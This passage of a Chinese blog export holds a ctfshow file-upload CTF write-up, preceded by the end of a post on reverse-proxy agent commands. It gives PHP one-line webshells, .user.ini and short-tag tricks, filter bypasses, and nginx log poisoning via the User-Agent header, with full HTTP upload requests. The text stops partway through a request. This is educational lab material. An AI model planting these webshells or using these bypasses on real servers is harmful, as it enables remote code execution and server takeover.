[靶机的公网ip]:9999\n```\n\n然后就可以了\n\n![image-20250315205420389](../image/achieve/202411/内网代理的搭建/image-20250315205420389.png)\n\n搭建反向代理，就让靶机去主动连接攻击机\n\n先在攻击机上监听端口\n\n```\n.\\windows_x64_admin.exe -l 9999\n```\n\n然后在靶机上进行反向代理的连接\n\n```\n.\\windows_x64_agent.exe -c [攻击机的公网ip]:9999\n```\n\n其实这里的话能不能开启代理主要有两个条件，一是需要被连接的靶机有公网ip，二是靶机和攻击机在同一个局域网中，二者满足其一就可以（这个是我和我朋友同时连接同一个热点然后实践实验出来的）说白了就是两个机子之间要能互相通信。\n\n","tags":["渗透"],"categories":["内网渗透"]},{"title":"web入门文件上传篇--ctfshow","url":"/2025/03/13/web入门文件上传篇-ctfshow/","content":"\n# 0x01前言\n\n之前只是做过ctfhub的文件上传的题目和一些赛题，并没有真正系统学习过文件上传，这次也是来到我期待已久的文件上传篇了\n\n# 0x02步入正题\n\n### 文件上传漏洞\n\n**一.介绍:**\n\n文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。\n\n要点:用户上传可执行文件，服务器未对文件进行一个合理的检查过滤\n\n**二.文件上传漏洞危害**\n\n- 上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。\n- 上传文件是Flash的策略文件 crossdomain.xml，黑客用以控制Flash在该域 下的行为(其他通过类似方式控制策略文件的情况类似);\n- 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行；\n- 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢 出服务器的后台处理程序，如图片解析模块;或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过\"本地文件包含漏洞(Local File Include)\"执行此脚本。\n\n**三.文件上传漏洞满足的条件**\n\n1.上传的后门文件，需要可以被脚本语言解析执行\n\n- 说明一：如果对方服务器运行的是PHP环境，你不能上传一个JAVA的后门代码\n- 说明二：上传文件的目录可以被脚本语言解析执行，如果没有执行权限也不行\n- 说明三：一般文件上传后会返回一个地址，如果无法连接到也不能构成文件上传漏洞\n\n**四.检测文件的流程**\n\n检测的内容一般有一下几个方面：\n\n客户端 javascript 检测 (通常为检测文件扩展名)\n\n服务端 MIME 类型检测 (检测 Content-Type 内容)\n\n服务端目录路径检测 (检测跟 path 参数相关的内容)\n\n服务端文件扩展名检测 (检测跟文件 extension 相关的内容)\n\n服务端文件内容检测 (检测内容是否合法或含有恶意代码)\n\n**五.htaccess文件**\n\nhtaccess 文件是一种用于 Apache Web 服务器的配置文件，它允许网站管理员对网站的访问权限、重写规则（URL 重写）、错误页面处理、MIME 类型设置以及其他服务器配置进行精细控制。这个文件通常位于网站的根目录或子目录中，并且其名称前面的点（.）表示它是一个隐藏文件，在大多数操作系统中默认不会显示。\n\n.htaccess 文件的一些常见用途包括：\n\n1. 访问控制：\n\n1. URL 重写：\n\n1. 自定义错误页面：\n\n1. MIME 类型设置：\n\n1. 缓存控制：\n\n1. 重定向：\n\n1. 其他配置：\n\n使用 .htaccess 文件进行配置时，需要注意以下几点：\n\n- .htaccess 文件对服务器性能有一定影响，因为每次请求时服务器都需要读取和解析该文件。因此，尽可能在服务器配置文件中（如 httpd.conf 或虚拟主机配置）进行全局设置，以减少性能开销。\n- 并非所有 Apache 安装都启用了 .htaccess 文件的功能。这取决于服务器的配置，通常通过 AllowOverride 指令来控制。\n- .htaccess 文件中的语法错误可能导致服务器配置失败，影响网站的正常访问。因此，在修改 .htaccess 文件后，应仔细检查语法，确保没有错误。\n\n# web151\n\n## #前端验证\n\n![image-20241119204931911](./../image/achieve/202411/文件上传--ctfshow/image-20241119204931911.png)\n\n题目就是答案，前台校验不可靠，所以应该是绕过前端验证的问题\n\n我们先写个一句话木马\n\n## 一句话木马\n\n```php\n<?php @eval($_POST[1]);?>\n```\n\n把php后缀名改成jpg进行上传，然后我发现jpg不行，我就改成了png\n\n用bp抓包上传，把png改回php，这样就可以绕过前端验证了\n\n![image-20241119205730440](./../image/achieve/202411/文件上传--ctfshow/image-20241119205730440.png)\n\n这里可以看到是上传成功了的，我们访问一下这个木马文件，注意路径是/upload/1.php\n\n访问后是空白页面，说明我们上传的png文件确实是改成php文件进行解析执行了，这时候我们用蚁剑一把嗦就行了\n\n![image-20241119210042377](./../image/achieve/202411/文件上传--ctfshow/image-20241119210042377.png)\n\n当然这道题还有非预期解，因为是js验证，所以我们禁用了js或者删除相应的js代码的话也是会让这个验证失效的\n\n# web152\n\n## #MIME验证\n\n![image-20241119210310957](./../image/achieve/202411/文件上传--ctfshow/image-20241119210310957.png)\n\n这次是后端验证，但是后端验证也有很多种，后来测试发现这里是MIME验证\n\n与前面的文件后缀不同，MIME类型 （Content-Type） 和文件后缀是两码事\n\n因为我们上一题是传的png格式，所以抓包的时候发现content-type头已经是图片类型格式头了，也就不需要改了直接改后缀就行\n\n![image-20241119211032008](./../image/achieve/202411/文件上传--ctfshow/image-20241119211032008.png)\n\n常规如果直接上传php文件的话需要修改content-type头为需要的格式才能通过MIME验证，不过这里一直都是要求的上传图片，所以也就没必要了\n\n# web153\n\n后端不能单一校验\n\n## #后缀名过滤\n\n像上次一样上传png改后缀试试看\n\n![image-20241119211518693](./../image/achieve/202411/文件上传--ctfshow/image-20241119211518693.png)\n\n把response里的msg内容解码一下，显示文件类型不合规，先换个MIME类型看看是不是类型的问题\n\n换了几个content-type类型后发现绕不过去，但是传png文件能成功php文件则不行，应该是对文件后缀进行的后端验证(试过了用大小写绕过能绕过去但是文件不能正常解析执行)\n\n因为是nginx的服务器，所以.htaccess文件不适用，改为上传user.ini文件\n\n先上传一个png后缀的一句话马，访问出来是图片\n\n![image-20250312182928875](../image/achieve/202411/文件上传--ctfshow/image-20250312182928875.png)\n\n然后写.user.ini文件\n\n```\nauto_prepend_file=1.png\n```\n\n记得绕过前端验证，上传后访问/upload，因为我们上传的目录是在/upload，.user.ini文件只是对当前目录下的php文件进行配置，所以访问当前目录，再用蚁剑连马\n\n在目录中找到源码分析一下\n\n```php\n<?php\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];//获取文件名\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);//获取文件大小并进行转换\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");//限制文件大小\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){//MIME类型验证\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];//取出后缀名并赋值给变量\n            if($ext_suffix!='php'){//检查后缀名是否为php\n                move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\n\necho json_encode($ret);\n```\n\n# web154\n\n后端不能单二校验\n\n## #内容过滤php\n\n```\nPOST /upload.php HTTP/1.1\nHost: d048b80d-596e-4fb2-9ad2-e9f03450eae6.challenge.ctf.show\nContent-Length: 208\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryn8WzTtV0RUl8O9A0\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://d048b80d-596e-4fb2-9ad2-e9f03450eae6.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://d048b80d-596e-4fb2-9ad2-e9f03450eae6.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryn8WzTtV0RUl8O9A0\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\n<?php @eval($_POST['cmd']); ?>\n------WebKitFormBoundaryn8WzTtV0RUl8O9A0--\n\n```\n\n上传后显示文件内容不合规，对内容进行了检测，把php去掉发现能正常上传，猜测是过滤了php关键字，用短标签去绕过或者换个一句话木马去绕过，但是如果换别的木马的话，因为.user.ini文件是让文件包含到当前目录的php文件中，所以行不通，换成短标签吧。\n\n先上传一个.user.ini文件操作1.png文件，然后上传一个1.png文件，数据包：\n\n```\nPOST /upload.php HTTP/1.1\nHost: 903eeed4-4f47-48ee-a83d-a6591086fde8.challenge.ctf.show\nContent-Length: 205\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryq5BjjtaE49tFLxhw\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://903eeed4-4f47-48ee-a83d-a6591086fde8.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://903eeed4-4f47-48ee-a83d-a6591086fde8.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryq5BjjtaE49tFLxhw\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\n<?=@eval($_POST['cmd']); ?>\n------WebKitFormBoundaryq5BjjtaE49tFLxhw--\n\n```\n\n上传后访问/upload，蚁剑连接就可以了，接下来我们分析一下里面的源码\n\n```php\n//upload.php\n<?php\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];//获取文件名\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);//获取文件大小\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");//限制文件大小\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){//检查MIME类型是否为png图像类型\n            $arr = pathinfo($filename);//获取文件名的信息。\n            $ext_suffix = $arr['extension'];//取出文件的扩展名\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);//获取文件上传的内容\n                if(strrpos($content, \"php\")==FALSE){//弱比较\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);//如果内容中不包含php，则成功上传\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>3,\"msg\"=>\"文件内容不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\necho json_encode($ret);\n```\n\n分析源码也是一种进步！\n\n# web155\n\n## #内容过滤php强比较\n\n后端不能单三校验\n\n看看这次又过滤了啥，但是好像之前的做法也能用，我们直接一把梭然后分析源码\n\n```php\n<?php\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];//文件名\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);//文件大小\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){//MIME类型检验\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){//文件后缀名过滤php\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE){//强比较，但不知道这里有什么区别\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\n\necho json_encode($ret);\n```\n\n一开始以为强比较和弱比较是没啥区别的，后面问了群友才知道\n\n![02a295ad4b5f52df2811e78b3dc63672](../image/achieve/202411/文件上传--ctfshow/02a295ad4b5f52df2811e78b3dc63672.png)\n\n# web156\n\n## #过滤方括号\n\n后端不能单四校验\n\n这里是过滤了`[]`方括号，看wp说可以用`{}`去绕过，结果真的可以\n\n分析源码\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && stripos($content,\"[\")===FALSE){//多过滤了方括号\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\n\necho json_encode($ret);\n\n```\n\n有点绷不住了，一开始一直提示文件类型不合规，绕了半天后面猜是源码写错了，结果一看真搞错了\n\n# web157\n\n## #分号过滤\n\n后端不能单五校验\n\n这次连着花括号一起过滤了，然后还过滤了分号，直接用system函数去查文件就行\n\n```\nPOST /upload.php HTTP/1.1\nHost: 521969e1-9c31-4ffa-9b8f-0335523c5e0b.challenge.ctf.show\nContent-Length: 210\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryig2gFBAAa73e1xWC\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://521969e1-9c31-4ffa-9b8f-0335523c5e0b.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://521969e1-9c31-4ffa-9b8f-0335523c5e0b.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryig2gFBAAa73e1xWC\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\n<?=system('cat ../flag.???')?>\n------WebKitFormBoundaryig2gFBAAa73e1xWC--\n\n```\n\n这里的 `<?=` 是一个完整的输出语句，它会执行 `system('cat ../flag.???')` 并输出其结果。由于 `<?=` 本身就是一个输出语句，因此在这种情况下，不需要额外的分号 `;` 来结束语句。\n\n```php\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content)){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;/i', $str);\n}//过滤函数\necho json_encode($ret);\necho json_encode($ret);nothing here\n```\n\n# web158\n\n没啥影响，也可以打通\n\n```php\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content)){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;|log/i', $str);\n}//多过滤了个log\necho json_encode($ret);\necho json_encode($ret);nothing here\n```\n\n# web159\n\n## #过滤括号\n\n这里过滤了括号，用内联执行去做就行\n\n```\n<?= `cat ../flag.???`?>\n```\n\n# web160\n\n## #过滤空格和反引号\n\n这里的话可以用日志文件包含去做，这也解释了为什么之前的那道题要过滤log了\n\n服务器是nginx的，日志文件的路径\n\n先上传.user.ini文件，然后找一下日志文件的位置\n\n先抓包，抓一个上传文件的包\n\n上传文件的包\n\n```\nPOST /upload.php HTTP/1.1\nHost: d2a29abe-04fe-4e55-ae31-596f4d4ea6dd.challenge.ctf.show\nContent-Length: 223\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXKUay7fvIGR1uM2m\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://d2a29abe-04fe-4e55-ae31-596f4d4ea6dd.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://d2a29abe-04fe-4e55-ae31-596f4d4ea6dd.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryXKUay7fvIGR1uM2m\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n------WebKitFormBoundaryXKUay7fvIGR1uM2m--\n\n```\n\n这里的话可以用字符串拼接的方法去绕过log\n\n然后发包后转向访问文件查看有没有日志文件的内容包含进来\n\n![image-20250313154644549](../image/achieve/202411/文件上传--ctfshow/image-20250313154644549.png)\n\n同时可以看到有UA头的内容的\n\n那我们试着在UA头包含一句话木马\n\n```\nPOST /upload.php HTTP/1.1\nHost: 2597b78b-bf1d-4ff0-b3e9-5a0de5f3f85d.challenge.ctf.show\nContent-Length: 223\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: <?php eval($_POST['cmd']);?>\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary0uB1Gssf46F3rihN\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://2597b78b-bf1d-4ff0-b3e9-5a0de5f3f85d.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://2597b78b-bf1d-4ff0-b3e9-5a0de5f3f85d.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundary0uB1Gssf46F3rihN\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n------WebKitFormBoundary0uB1Gssf46F3rihN--\n\n```\n\n然后访问连马就行了\n\n# web161\n\n## #文件头检测\n\n这次上传.user.ini的时候出现了文件类型不合规p，不过我猜又是对文件内容的检查，试一下添加文件头\n\n```\nPOST /upload.php HTTP/1.1\nHost: 50dc3f13-cc45-4c5d-b558-00dce06c2aed.challenge.ctf.show\nContent-Length: 209\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarydyi24Ek00bnae0bD\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://50dc3f13-cc45-4c5d-b558-00dce06c2aed.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://50dc3f13-cc45-4c5d-b558-00dce06c2aed.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundarydyi24Ek00bnae0bD\nContent-Disposition: form-data; name=\"file\"; filename=\".user.ini\"\nContent-Type: image/png\n\nGIF89a\nauto_prepend_file=1.png\n------WebKitFormBoundarydyi24Ek00bnae0bD--\n\n```\n\n成功上传，那日志文件包含加个文件头就行\n\n```\nPOST /upload.php HTTP/1.1\nHost: 50dc3f13-cc45-4c5d-b558-00dce06c2aed.challenge.ctf.show\nContent-Length: 231\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36<?php%20eval($_POST['cmd']);?>\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary6ADWUFyYgWfKHTCY\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://50dc3f13-cc45-4c5d-b558-00dce06c2aed.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://50dc3f13-cc45-4c5d-b558-00dce06c2aed.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundary6ADWUFyYgWfKHTCY\nContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"\nContent-Type: image/png\n\nGIF89a\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n------WebKitFormBoundary6ADWUFyYgWfKHTCY--\n\n```\n\n这次的源码不太一样\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-10-24 19:34:52\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-10-26 15:49:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nerror_reporting(0);\nif ($_FILES[\"file\"][\"error\"] > 0)\n{\n\t$ret = array(\"code\"=>2,\"msg\"=>$_FILES[\"file\"][\"error\"]);\n}\nelse\n{\n    $filename = $_FILES[\"file\"][\"name\"];\n    $filesize = ($_FILES[\"file\"][\"size\"] / 1024);\n    if($filesize>1024){\n    \t$ret = array(\"code\"=>1,\"msg\"=>\"文件超过1024KB\");\n    }else{\n    \tif($_FILES['file']['type'] == 'image/png'){\n            $arr = pathinfo($filename);\n            $ext_suffix = $arr['extension'];\n            if($ext_suffix!='php'){\n                $content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n                if(stripos($content, \"php\")===FALSE && check($content) && getimagesize($_FILES[\"file\"][\"tmp_name\"])){\n                    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\".$_FILES[\"file\"][\"name\"]);\n                    $ret = array(\"code\"=>0,\"msg\"=>\"upload/\".$_FILES[\"file\"][\"name\"]);\n                }else{\n                    $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n                }\n                \n            }else{\n                $ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n            }\n    \t\t\n    \t}else{\n    \t\t$ret = array(\"code\"=>2,\"msg\"=>\"文件类型不合规\");\n    \t}\n    \t\n    }\n\n}\nfunction check($str){\n    return !preg_match('/php|\\{|\\[|\\;|log|\\(| |\\`/i', $str);\n}\necho json_encode($ret);\n\n```\n\n使用 `getimagesize()` 来确保上传的文件是图片文件，通过解析文件的头部信息来确定文件是否为有效的图像文件\n\n# web162\n\n## #过滤了小数点\n\n上传.user.ini的时候就受阻了，伪造了文件头也一样，看看是不是在这里过滤了什么\n\n测了一下发现过滤了小数点，那我们指定的文件就不加小数点就行了，反正都要被当成php文件包含进去，关键在于如何绕过木马中的小数点\n\n这里的话依旧使用日志包含\n\n```\nPOST /upload.php HTTP/1.1\nHost: fe1b607e-5063-4a37-b0d2-c72875564f04.challenge.ctf.show\nContent-Length: 300\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryA8nhZc4rf82KOfXq\nSec-Ch-Ua-Mobile: ?0\nOrigin: 